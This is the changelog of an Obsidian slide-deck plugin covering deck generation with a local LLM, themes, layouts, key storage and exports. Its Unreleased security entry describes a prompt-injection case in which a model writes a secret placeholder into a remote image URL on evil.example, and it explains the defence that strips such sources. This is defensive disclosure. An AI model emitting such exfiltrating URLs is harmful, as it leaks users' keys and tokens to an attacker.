# Changelog

All notable changes to this project are documented here.
Format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
versioning follows [SemVer](https://semver.org/).

## [Unreleased]

### Security

- **A generated deck can no longer load remote resources.** Because secrets in your note are now replaced by placeholders on the way to the model and put back into the answer, a prompt-injected model could write a placeholder into an image URL (`![x](https://evil.example/?d=…)`), a raw `<img src=…>` or a CSS `url(…)` and have the secret fetched as soon as the deck is previewed or the note is opened. The plugin now defuses remote sources in the model's answer before the note is written: remote Markdown images, raw `<img>`/`<iframe>`/… with a remote `src`, `url(http…)` in `style`, and the code-block processors `dataview`, `dataviewjs` and `js-engine`. Fences (code, Mermaid, image slots), layout directives, `![[…]]` embeds, `data:` images and relative paths stay. Limits, stated plainly: this is a **text-layer** defence, not a guarantee; clickable links stay (a click is a deliberate act); a remote image you wrote into a note yourself is not touched, only the model's answer. A DOM-based layer is planned.

### Changed

- **The whole LLM connection now comes from the Kit** (`createLlmConnection`, obsidian-kit 0.51.2 / code-kit 0.15.0): endpoint source, endpoint list, request parameters, the chat client with its deadlines, and the response check. The plugin's own resolver, client factory, backend-probe cache and deviation texts are gone. Visible consequences:
  - **API keys move into Obsidian's secret storage.** A key you entered in the endpoint list is no longer written to `data.json`; existing plain-text keys are moved on first start (or when the endpoint is first resolved). The Keychain entries show under *Settings → Keychain*. **Obsidian 1.11.4 or newer is now required** (`minAppVersion` was 1.8.7).
  - **Secrets in your note no longer leave your machine in clear text.** Private keys, bearer tokens and API keys in the note are replaced by placeholders before the text goes to the model; the generated deck gets the originals back. The *Request* section's "last request" shows what was actually sent.
  - **The endpoint section, the endpoint list and the *Request* section use the Kit wording**: "Test connection", "Try this endpoint first", "Refresh models", "Timed out — network unreachable.", "Not reachable — {reason}". Order in the tab: endpoints and request, then the model, the token budget and the thinking test.
  - **A saved choice of an endpoint or model in the LLM Endpoint Manager only counts while the manager is installed.** Without it the local list and its model always apply (a stale manager choice could override the local model before).
  - **A model typed into the generate panel still goes out as typed**; the family and sampling profile follow that model.
  - The deviation notice (the model thought although thinking is off, an empty answer because thinking used the token budget, …) now has the Kit wording.
  - The generate panel shows reachable / not reachable only; the finer diagnosis (key refused, wrong path) stays on the endpoint row in the settings.
  - Deadlines are unchanged: 10 minutes to the first chunk, 2 minutes of silence afterwards.
  - The *Request* section shows the profile temperature even for the thinking test, which sends temperature 0 for that one request.
- Kit pin: obsidian-kit 0.51.2, code-kit 0.15.0, all modules on that one ref.
- Minimum Obsidian version 1.11.4 (was 1.8.7), needed for the secret storage.

## [0.13.1] — 2026-10-03

### Changed

- The changelog is now written entirely in English.
- The documentation index lists the sample decks (demo, regression, layouts).
- Internal design notes moved out of the repository; the user documentation is unchanged.

## [0.13.0] — 2026-09-30

### Security

- Runtime dependencies updated to close two advisories the Store gate scan reports: `markdown-it` 14.3.2 (GHSA-253c-mchw-3w2r, quadratic linkify paths) and, via `mermaid`, `dompurify` 3.4.16. No user-visible change.

### Added
- The GitHub release now also carries a ready-to-unpack `slide-deck.zip` (the plugin folder with `main.js`, `manifest.json` and `styles.css`) and a `checksums.sha256` file. For a manual install, download the zip and unpack it into `.obsidian/plugins/` instead of creating the folder and saving three files by hand.

### Changed
- Kit chat client 0.44.0 (no user-visible change).
- **Sampling profiles for the `creative` mode.** Deck generation now sends the temperature and the family-specific sampling values (top_p, top_k, …) from the shared profile tables, and your token budget goes in as `max_tokens` — raised to the family's reserve where thinking would otherwise eat it. The model family comes from the LLM Endpoint Manager or is guessed from the model name; the backend is detected once per endpoint (cached 30 s). New section **Settings → Request** shows what is sent and what actually takes effect, lets you override single values per model family, and lists the last request and deviations seen this session (e.g. "the model thought although thinking is off"). The thinking level is chosen there too.
- **Temperature and "Suppress model thinking" moved into that section.** Migration on first start: the old suppress switch becomes the thinking level (`on` → off, the old default; `off` → "medium"), so nothing changes for existing installs; new installs start with the profile default ("medium" for creative). An old temperature that differs from the former default 0.3 becomes an override for unknown model families, with one notice; a value equal to 0.3 is dropped. Deviation from recipe 3 of the sampling plan: the family is not resolved when settings load, hence "unknown". The old fields are removed from `data.json` on the first save. Max. output tokens stays where it was.
- The "Thinking test" button (real, minimal request with thinking off) stays, as its own row "Thinking test" right below the Request section.
- The request goes out under the model's resolved name (alias applied). Kit modules added: `request-section`, `request-session`, `collapsible`, `clipboard` (Obsidian layer), `capabilities` (backend probe); Kit pin unchanged at 0.43.0.

### Fixed
- German settings tab: the heading "Slide deck" is now "Foliensatz", the field "Endpoints" is "Endpunkte", and the model description no longer says "Endpoint" — the tab is German throughout. English is unchanged.

## [0.12.0] — 2026-09-26

### Changed
- **The chat path runs through the Kit chat client** (`createChatClient` from `obsidian-kit` 0.43.0: XHR stream, `requestUrl` as the fallback without a stream) instead of the plugin's own `llm-client`/`llm-stream`. Visible consequences: (1) **A silent server now ends the generation**: after 2 minutes without data, or 10 minutes before the first byte (model loading, long prompt) — before, the request waited forever. (2) **HTTP errors carry the reason**: instead of “stream HTTP 400” the message is the server's own text (or “HTTP 502” if the body is empty), shown as “Server error: …”; new sentences for “no answer from the endpoint”, “endpoint not reachable” and “input too long for the model's context window” (English/German). (3) The CORS notice now appears whenever the answer did not arrive as a stream, including a server that ignores `stream: true` and returns a full completion. Unchanged: message form, `temperature`/`max_tokens`, suppress-thinking parameters, Stop (abort), the retry after an invalid deck, `finish_reason: length` with or without text.
- **Kit pin `obsidian-kit` 0.43.0** (was 0.41.1): `endpoint-list` and `stream-area` CSS in `styles.css` brought to the 0.43.0 state (child selectors for the endpoint row, new classes for the key hint and extra row, hidden empty stream slots). `chat-client`, `chat-transport` and `clock` are new; `think.ts` is now `think-splitter.ts` as in the Kit.

### Added
- GUI-Smoke section G (`--with-model`): a deck generation against a real endpoint (streamed in pieces, Stop within seconds, a wrong path answered with HTTP 200 + error body becomes a message); endpoint and model via `SD_SMOKE_ENDPOINT` / `SD_SMOKE_MODEL`.

## [0.11.0] — 2026-09-26

### Added
- **Help row at the very top of the settings** (UI-STANDARD §8): a text button “Open documentation” that leads to the documentation index, and a bug icon that leads to the issue tracker on GitHub. Kit module `help-setting.ts` from obsidian-kit 0.43.0, pinned on its own; the other vendored modules stay unchanged.

### Changed
- **Endpoints come from the LLM Endpoint Manager when it is installed** (Kit `endpoint-source`, `obsidian-kit` 0.41.1, `code-kit` 0.7.0 re-vendored). The Manager takes precedence; the local endpoint list stays as a fallback and is unchanged while the Manager is missing or off. Visible consequences: (1) With the Manager, the settings tab shows the block “Endpoints come from the LLM Endpoint Manager” (endpoint choice, model choice, import of the local endpoints into the Manager) instead of the local endpoint list and the global model row; the local list and `llmModel` stay stored, only hidden. (2) The model in the Generate view then starts with the Manager's choice or the endpoint's default model instead of `llmModel`. (3) New setting `choice` (`endpointId`, `model`) keeps the choice against the Manager; an old `data.json` without `choice` loads unchanged. (4) If the Manager reports no endpoint, there is no local fallback — the Generate view shows “no endpoint”.

## [0.10.1] — 2026-09-24

### Added
- **Three new slide layouts `agenda`, `threads`, `closing`** from the slide specimens of Order from Traces. They come with `deck-core` 0.12.0 (re-vendored, `e62dfa8`) and work in every theme; `kogane` and `kami` additionally lay a veil over the background on `closing`. `agenda` reads a numbered list with a meta note as inline code at the end, `threads` a numbered list with `**card title**`, and `closing` a bullet list `**key** value`. Documentation in `docs/layouts.md`, example in `docs/themes/traces-layouts-deck.md`. The deck prompt of the Generate view now offers the three layouts to the model as well.

### Changed
- **BREAKING: The two built-in Order from Traces presets are now called `kogane` (dark, formerly `kuro`) and `kami` (light, formerly `shiro`).** They carry the values of Order from Traces but were named after the modes of birds of yore; Order from Traces named its modes on 2026-09-20 (decision by Johannes). Values, atmosphere and labels stay, only the keys change. Comes with `deck-core` 0.13.0 (re-vendored, `86980bb`).
- **There are deliberately no backward aliases** — the old names become free for the birds of yore presets. A deck with `theme: kuro` therefore silently falls back to `kami`, so it turns light instead of dark. All decks, fixtures and documentation passages of this repo are updated; a `theme:` in your own note has to be updated by hand. The aliases `dark` → `kogane` and `default`/`serif` → `kami` still apply.
- The fallback for an unknown theme key is called `kami` accordingly; `defaultTheme` in the settings now defaults to `kami`.

- **Preview and Generate now share ONE sidebar with a tab bar** (UI-STANDARD §8, Kit block `buildHubInto` from `obsidian-kit`@0.35.0) instead of two separate leaves (`slide-deck-preview`/`slide-deck-generate`). Both commands and the ribbon button open the same hub view (`slide-deck-hub`) and only switch the tab. Visible consequence: a saved workspace layout with the old view types shows an empty pane there until the hub is opened once again.
- Folder settings (`exportFolder`, `themesFolder`) now use the native `type: "folder"` control (Obsidian suggestion list via the Kit walker fallback `src/vendor/kit-obsidian/settings_walker.ts`, unchanged since 0.35.0) instead of a plain text field.
- **The streaming answer area in the Generate-deck panel now runs through `buildStreamArea` from `obsidian-kit` (UI-STANDARD §8) instead of its own `<details>`/`<pre>` build.** Two behavior changes: the thinking block is open while the stream is running (before, it stayed collapsed until the first manual expand), and the scroll follows the running text only while the reader is at the bottom anyway (`followTail`) instead of jumping to the end unconditionally.
- Kit pin `obsidian-kit` 0.26.0 → 0.35.0 (`code-kit` 0.6.0) — all vendored modules under `src/vendor/kit(-obsidian)` re-pulled, now via `tools/sync-kit.sh` (taken over from `lingotuner`) instead of by hand.

## [0.10.0] — 2026-09-06

### Added
- **Image slots:** a ```slide-image``` code block renders in reading view as a card with a Generate button, calls the neighbor plugin `local-image-generator` through its API to create the image, and after saving replaces itself with an ordinary embed plus the prompt as a comment, as the starting point for a later re-roll by hand (nothing reads that comment automatically). The new command “Insert image slot” inserts a placeholder with a function choice.
- **Six image functions** (documentary, analytical, metaphorical, emotional, navigational, decorative) control, as prompt building blocks, how an image slot is worded; the building blocks are editable per function in the settings.

### Changed
- The §8 status vocabulary (`is-checking`/`is-ok`/`is-error`) now also moves on the image-slot button — the same icon language as for the AI endpoints, for a second runtime state instead of a newly invented one.

## [0.9.0] — 2026-08-20

### Added
- **A deck can carry two theme variants.** Every token of a slide directive after the layout name becomes a CSS class: `<!-- layout: default sand -->` produces `.sd-slide.sd-mod-sand`. A theme can thereby carry both palettes of a template and switch per slide — until now `theme:` applied indivisibly to the whole deck, and a foreign token was discarded *and* reported as an error.
- **Warnings distinguish three severities.** The preview colors the stripe on the left by severity and puts a shape character in front of the line (▲ error · ● warning · ℹ note), so the meaning does not depend on color alone (WCAG 1.4.1) — the same promise as with the callouts. New dictionary entries in EN and DE.

### Fixed
- **Images on two- and three-column slides are now bounded.** They were entirely unconstrained, broke through the slide edge and pushed the footer out of the picture — visible in the preview *and* the export. Single-column slides render unchanged.
- **A custom layout name no longer raises an alarm.** A theme may define its own layouts and modifiers; the core already passed the name through, but the preview tinted the slide amber and additionally reported a wrong region count. Both reported the intended extension path as a defect. The notes remain — as `info`, without a stripe.
- **Mermaid diagrams sit vertically centered** instead of pinned to the top, with the free space gathered below.

### Changed
- **Vendored core raised to deck-core 0.5.0** (`4fc922d`).

## [0.8.0] — 2026-08-14

### Added
- **The `crimson` family as a built-in theme** — `crimson-dark`, `crimson-dark-lc`, `crimson-light`, `crimson-light-lc`. A serif display over a mono body text, plus a fine scanline and a glow on `h1` that the low-contrast modes dampen or switch off. Selectable via `theme:` like the Nordstern themes; code highlighting and Mermaid theme come along. No new third-party CSS files are needed. Comes from deck-core 0.4.0 (Marp import, level A: colors/fonts/atmosphere).

### Changed
- **Vendored core raised to deck-core 0.4.0** (`01da676`).

## [0.7.3] — 2026-08-12

### Fixed
- **`authorUrl` now points at GitHub instead of the author's own domain.** The store review
  repeatedly reported "Manifest URL field is not reachable" for `https://jkaindl.de`, while
  every counter-check found it up (IPv4, IPv6, `HEAD`, `www`, from outside the author's
  network, no rate limiting) — the finding was not reproducible and the cause stayed open.
  It is also beside the point: `authorUrl` is an availability promise made to an outside
  checker, and tying it to a self-hosted server re-risks it on every restart. The domain
  remains in the repository, the imprint and the release page.

### Note
- **`main.js` is unchanged from 0.7.1 and 0.7.2** (sha256 `3cc119bf…`). This release carries
  a manifest correction only; nothing about the running plugin differs.

## [0.7.2] — 2026-08-12

### Changed
- **The lint run is clean: zero errors, zero warnings.** Nine `obsidianmd/prefer-create-el`
  warnings in the vendored DOM layer are gone. They were long treated as an accepted
  remainder because warnings don't block a store review — that bar was too low, and it had
  quietly turned a known finding into background noise.
- The fix is a narrower type, not a suppression. `deck-core` 0.3.0 asks for a `HostDocument`
  port (six members) instead of a full `Document`; the rule targets any receiver typed as a
  document. A real `Document` satisfies the port structurally, so no call site changed.
  **No `eslint-disable` was used**, and the scanner's own autofix (`doc.win.createEl`) was
  never viable here — `.win` is an Obsidian augmentation and this code renders into foreign
  realms.

### Note
- **`main.js` is byte-identical to 0.7.1** (sha256 `3cc119bf…`, 4,530,422 bytes): the change
  lives entirely in the type system and emits no different JavaScript. Nothing about the
  running plugin differs from the previous release.

## [0.7.1] — 2026-08-12

### Changed
- **`main.js` shrank from 5.25 MB to 4.32 MB**, back under the size the Community
  review flags. The cause was `highlight.js`: importing it whole pulls in all ~190
  grammars (1,055 KB bundled), and no bundler can shake them out — they register by
  side effect. `deck-core` 0.2.0 registers twenty instead (105 KB).
- **Code fences in a language outside that set still render**, as escaped plain text
  without colouring — the renderer checks `getLanguage` and degrades rather than
  failing. Highlighted: bash, cpp, csharp, css, diff, go, java, javascript, json,
  kotlin, markdown, php, python, ruby, rust, sql, swift, typescript, xml/html, yaml.

### Fixed
- Dependency advisories closed via `npm audit fix` (linkify-it, dompurify, mermaid);
  `npm audit --omit=dev` reports none. The remaining advisories are build-time only
  (esbuild/vite/vitest) and never reach the shipped bundle.

## [0.7.0] — 2026-08-10

### Added
- **API key per endpoint row.** Each entry in the fallback list carries its own key, so a local
  server and a hosted provider can live in one ordered list. The key reaches every network path
  — chat completion, model list, both context probes and the stream — not just the chat request.
- **Model override per endpoint row.** Leave the field on "global model" and the model setting
  below still applies. The request path already honoured such overrides; only the input was
  missing.
- Endpoint rows can be reordered ("use first") and state their role in words — "in use",
  "reachable, position 2", "not reachable" — instead of encoding it in colour alone.
- A third-party notice appears on any row that carries a key: requests from that row leave your
  machine. The key itself is never shown, in the field or in the tooltip.

### Changed
- The endpoint row editor now comes from `obsidian-kit` (`buildEndpointList`) instead of a local
  copy. Alongside that: label and description sit above the list rather than squeezed into the
  first row, rows are locked while a change is being saved, and a failed save no longer leaves
  the list stuck behind a blocked interface.
- The model field no longer preselects the first server model when nothing is saved. It shows an
  explicit "not set" option instead, so what you see is what is stored.
- The slide core (model, renderer, themes, layout, deck prompt) now lives in `deck-core` and is
  vendored here as a pinned copy. No behaviour changed: slide HTML and deck CSS are byte-identical
  to the previous release across every theme.
- Shared logic that had drifted into local copies — SSE parsing, endpoint diagnostics, the model
  list, the settings walker — is taken from `obsidian-kit` again.
- The canonical repository moved from Codeberg to a self-hosted Forgejo instance. GitHub remains
  the mirror the community store reads.

### Fixed
- Clicking the trash or "use first" button no longer acts on the wrong row when another row's
  edit was committed in the same instant.
- The obsidian lint plugin is pinned to a current version. It had been resolving to an outdated
  release in which some store review rules did not exist, so `npm run lint` passed locally while
  the review reported findings.

## [0.6.1] — 2026-07-19

### Fixed
- Community store review flagged two `eslint-disable` comments as not permitted. Both are
  resolved without disabling anything:
  - The explorer-hide stylesheet now resolves the main window's document explicitly through
    `workspace.rootSplit.doc` instead of the bare `document` global. Same target as before —
    the file explorer's window, deliberately not `activeDocument`, which is what caused the
    0.4.0 `NotAllowedError`.
  - The model field's placeholder reads "Model ID such as qwen3", keeping the model id in its
    real lowercase form while satisfying the sentence-case rule. It is now translatable.
- The explorer-hide is applied on layout-ready rather than during `onload`, where the
  workspace root is not guaranteed to exist yet.

## [0.6.0] — 2026-07-16

### Added
- AI settings: endpoint row editor with a live connection check, one-click provider presets
  (LM Studio / Ollama), a plain-text diagnosis per endpoint, and non-blocking input warnings.
- AI settings: model dropdown populated from the endpoint, with a plain-text fallback when
  offline and the model's context length shown when the server reports it.
- AI settings: a "Test" button next to the thinking toggle — runs one real minimal call and
  reports whether the model actually stopped thinking. Models that cannot disable thinking
  (gpt-oss/harmony) now show a disabled toggle instead of a silently ineffective one.

### Fixed
- Connection checks reported "reachable" for any endpoint answering HTTP 200, including
  servers that are not an OpenAI-compatible API.
- Thinking suppression parameters were sent to always-on reasoning models that reject them.
- Plugin activation no longer crashes with `NotAllowedError` when a popout window is active
  at load time: the explorer-hide stylesheet is now built and adopted in the main window's
  document (where the file explorer lives), wrapped so the cosmetic hide can never break
  `onload`.
- `npm run release` now verifies the GitHub mirror after the dual-push: tag and default
  branch must carry the release commit, otherwise the release fails loudly. A silently
  failed branch push had frozen the community store on 0.4.0 (the store reads the plugin
  version from the default branch's `manifest.json`).
- Cover-image corner slots (header/footer/pagination) no longer double their glyph edge into
  a faint "ghost" ring over bright backgrounds — one soft `text-shadow` instead of two.
- The content `<hr>` gradient is symmetric now: both ends fade equally through matching
  gold-tinted shoulders (previously the left edge read slightly harder than the right).

## [0.5.0] — 2026-07-08

First release to ship local-LLM deck generation (developed but never released on 0.4.x)
alongside the new design system.

### Added
- **Generate a deck from a note with a local LLM** — a sidebar view (ribbon 🪄) turns the active
  note into a slide deck via an OpenAI-compatible local endpoint (LM Studio / Ollama). Model
  picker from the endpoint, streaming with a non-streaming fallback for the CORS "ping ✓, stream ✗"
  asymmetry, a retry cap, and an "AI (local)" settings group. No cloud, no telemetry.
- Generated decks record their origin (`source: "[[Note]]"` backlink) and the model used
  (`model:` in frontmatter).

### Changed (BREAKING)
- **Design system**: modular type scale (ratio 1.25), spacing tokens, vertical rhythm, alignment
  axioms (lists never line-centered; hero layouts center blocks). Existing decks render
  differently (better).
- **Built-in themes replaced**: shiro 白 (new default, light), kuro 黒, sumi 墨, kairo 回路,
  kurenai 紅. Legacy keys (default, dark, serif, high-contrast) resolve silently via aliases;
  a persisted `defaultTheme` migrates on load.
- Dark built-ins use a real dark highlight.js scheme and mermaid "dark" (fixes light mermaid on
  dark themes); kuro carries an atmosphere layer (grain, glow, vignette) and warm, semantically
  separated callout hues.
- User themes inherit the code/mermaid scheme from shiro; new optional character tokens
  (display style/weight/tracking, eyebrow font — see THEMING-GUIDE) and a `/* sd-label */` meta
  for readable dropdown names.
- LLM deck prompts: hero layouts restricted to sparse content, bullet budgets, kicker convention.

### Fixed
- **Plugin failed to re-enable or update** ("could not be loaded") — the themes-folder hide built
  its stylesheet in the main-window realm but adopted it into `activeDocument`; adopting a
  constructed stylesheet across documents throws `NotAllowedError`. Now built in the active
  document's own realm.
- **Settings tab rendered blank on Obsidian < 1.13** — the imperative `display()` fallback is
  restored (walks the same `getSettingDefinitions`), so the tab works on public Obsidian again.
- **Export layout**: two-column stagger (phantom grid cell), the missing `cover` layout alias,
  and `header/footer/paginate` landing in the body instead of the frontmatter.

### Compatibility
- **`minAppVersion` back to 1.8.7** (reverses the 0.4.0 raise to 1.13.0). 0.4.0 was effectively
  gated to Obsidian Catalyst/Insider; 0.5.0 runs on public Obsidian again.

### Internal
- Regression net: canonical testdeck fixture + per-slide HTML and owned-CSS snapshots + targeted
  guards (separator vs. `<hr>`, embed refs with spaces/em-dash, callout token cascade).
- Shared modules vendored from obsidian-kit (ThinkSplitter, parseSSE, endpoint, mergeSettings).

## [0.4.0] — 2026-06-30

Follow-up to the Obsidian community-plugin review — clears the remaining advisories.

### Changed

- **Settings tab migrated to the declarative settings API** (`getSettingDefinitions`), replacing
  the deprecated imperative `display()`. Controls bind through `get`/`setControlValue`; the
  theme-key chips and the export-theme picker use `render`. No change to which settings exist or
  how they behave.
- **Documentation** — the per-slide layout syntax (templates, density modifiers, the
  layout/column directives, inference) moved into a dedicated guide (`docs/layouts.md`,
  `docs/layouts.de.md`); the README links to it. This also clears the review's README
  "placeholder text" warning, which the literal `<!-- layout -->` directive examples had tripped.

### Compatibility

- **`minAppVersion` raised from 1.8.7 to 1.13.0** — the declarative settings API requires
  Obsidian 1.13.0. Users on older Obsidian releases should stay on 0.3.1.

## [0.3.1] — 2026-06-30

Maintenance release for the Obsidian community-plugin review — no user-facing behaviour change.

### Changed

- **Obsidian lint compliance** — cleared every `eslint-plugin-obsidianmd` finding from the
  community-plugin review without inline `eslint-disable` comments:
  - Static inline styles (off-screen iframe staging, the deck-scale transform origin, the
    preview overflow clip) moved into CSS classes (`styles.css` / `STRUCTURE_CSS`); only
    genuinely per-render values (the fit scale and box size) stay inline via `setProperty`.
  - The realm-safe HTML insertion in the renderer no longer uses `innerHTML` — it parses with
    `DOMParser` and imports nodes via `importNode` + `replaceChildren` (verified equivalent,
    including Mermaid SVG namespacing).
  - `processFrontMatter` access is typed instead of suppressed.
  - The two remaining file-scoped overrides (a lazy `require("electron")`, a shadowed
    deprecated `display()`) are unavoidable and documented in `eslint.config.mjs`.
- **README** — refreshed for the 0.3.0 template model (nine templates, density modifiers, deck
  slots, smart layout inference, media-fill) and bumped the release badge.

### Fixed

- CHANGELOG 0.3.0 incorrectly said "eleven" templates; the template count is **nine**.

## [0.3.0] — 2026-06-28

### Added

- **Template/layout model** — nine per-slide templates (`default`, `title`, `section`, `quote`,
  `image-focus`, `two-column`, `columns-3`, `stat`, `cover-image`) plus combinable density
  modifiers (`compact`, `code-heavy`), chosen with `<!-- layout: <template> [modifier…] -->`.
  In multi-column layouts the title spans all columns.
- **Media that fills and centers** — block images and Mermaid diagrams now occupy the available
  space, horizontally and vertically centered and scaled to fit (`object-fit: contain`), for both
  Obsidian `![[embeds]]` and standard `![](…)` images — instead of flowing small and left-aligned.
- **Deck slots** — `header:`, `footer:` and `paginate:` frontmatter render as floating corner
  slots (pagination shows `n / N`).
- **Smart layout inference** — with no explicit directive, a lone heading becomes `section`, a lone
  quote becomes `quote`, a lone image/diagram becomes `image-focus`, and `<!-- column -->` splits
  pick `two-column`/`columns-3`; an explicit `<!-- layout -->` always wins.
- **Sparse slides compose vertically** — slides with little content are vertically centered instead
  of clinging to the top.
- **Per-theme code & Mermaid** — a user `.css` theme can declare its highlight.js and Mermaid theme
  via `/* sd-hljs: … */` and `/* sd-mermaid: … */` header directives, so dark decks get dark code
  and dark diagrams.

### Fixed

- Callout colours now derive from theme tokens, so dark themes render dark callouts without
  per-theme overrides.
- Mermaid diagrams scale to fill their area instead of being capped small.

## [0.2.0] — 2026-06-28

### Fixed

- PNG export no longer collapses inter-word spaces (switched the rasterizer from
  html2canvas to `modern-screenshot`).
- PDF export now prints the theme background (`print-color-adjust: exact` in `PRINT_CSS`) —
  dark themes no longer print on white.

### Added

- **Mobile support** (`isDesktopOnly: false`) — the plugin now runs on iOS/iPadOS. All
  desktop-only APIs are platform-guarded. On mobile, PDF export writes a self-contained HTML
  file into the export folder and opens it via the OS (`openWithDefaultApp`); the user then
  prints or shares to PDF from there.
- **Live theme switcher** — the preview toolbar now has a theme dropdown for ephemeral try-on, a
  source label (`from frontmatter` / `from default` / `● unsaved`) that disambiguates where the
  active theme comes from, and a **Set** button that writes `theme:` into the note's frontmatter
  via `setNoteTheme` (`processFrontMatter`). Fixes the „theme dropdown does nothing" confusion.
- **User themes** — drop `.css` files into the configurable themes folder (default
  `Slide-Deck-Themes/`); the frontmatter `theme:` value is the filename without the `.css`
  extension. Each file is a `--sd-*` token block with optional extra CSS; user themes inherit
  the built-in `default` theme's code-highlight and Mermaid styles. The Settings tab shows all
  valid theme keys live.
- **Theme import/export** — an **Open in Finder** button reveals the themes folder (drop files
  in); **Export theme as .css** writes any theme as an editable `.css` starting point; a toggle
  hides the themes folder in Obsidian's file explorer.

## [0.1.0] — 2026-06-27

First release.

### Added

- **Markdown notes → slides** — a `---` separator line splits a note into individual slides;
  YAML frontmatter (`theme:`, `aspect:`, `minFontPx:`) controls deck-level directives.
- **Live preview pane** (`Open presentation preview` command) — renders the current note as a
  slide deck in the right sidebar, scaled to the pane width, with a source-jump link to each
  slide's originating line.
- **Theme isolation** — slides render inside a sandboxed iframe, so the active Obsidian theme
  can never leak into the preview or the exports; a deck looks identical regardless of the vault
  theme.
- **Four built-in themes** — `default` (light), `dark`, `serif`, and `high-contrast`, selected
  per deck via the `theme:` frontmatter; each carries a matching code-highlight and Mermaid theme.
- **Per-slide layouts** — `title`, `two-column`, `image-focus`, `section`, and `quote`, chosen
  per slide with an HTML comment directive (`<!-- layout: two-column -->`) and a `<!-- column -->`
  region separator.
- **Custom CSS** — an optional CSS snippet (Settings) is appended to the deck styles for branding
  and tweaks, in both the preview and the exports.
- **Fit-or-warn readability** — each slide auto-scales its content down to a configurable
  legibility floor (`minFontPx`, default 24 px); slides that would need even smaller text are
  flagged as overflowing (with a click-to-source warning) rather than becoming unreadable.
- **PDF export** (`Export presentation to PDF` command) — prints the deck (one slide per page,
  exact geometry) via the system print dialog (choose "Save as PDF"), theme-isolated.
- **PNG image-series export** (`Export presentation to image series` command) — captures each
  slide via html2canvas and writes numbered PNGs into a configurable export folder.
- **KaTeX math** — inline `$…$` and display `$$…$$` math.
- **Code highlighting** — fenced code blocks highlighted by highlight.js (per-theme stylesheet).
- **Accessible callouts** — `> [!note]`, `[!warning]`, `[!danger]`, `[!tip]`, `[!info]` blocks
  rendered with redundant coding: border colour + geometric shape + visible label word (not
  colour-only; WCAG 1.4.1).
- **Mermaid diagrams** — fenced ` ```mermaid ``` ` blocks rendered as SVG (per-theme).
- **EN/DE interface** — all UI strings follow Obsidian's language setting (English canonical,
  German supported); the settings tab and every notice are localized.
- **Settings tab** — default theme, minimum body font size, image-export scale, custom CSS, and
  export folder.
- **Pure-core architecture** — `src/core/**` is Obsidian-free and Node-testable; a core-purity
  check and a realm-safety check run as part of `npm test`, alongside a real-bundle smoke test
  and 63 unit tests.

### Notes

- Desktop only (`isDesktopOnly`) — PDF/PNG export needs a full browser DOM.
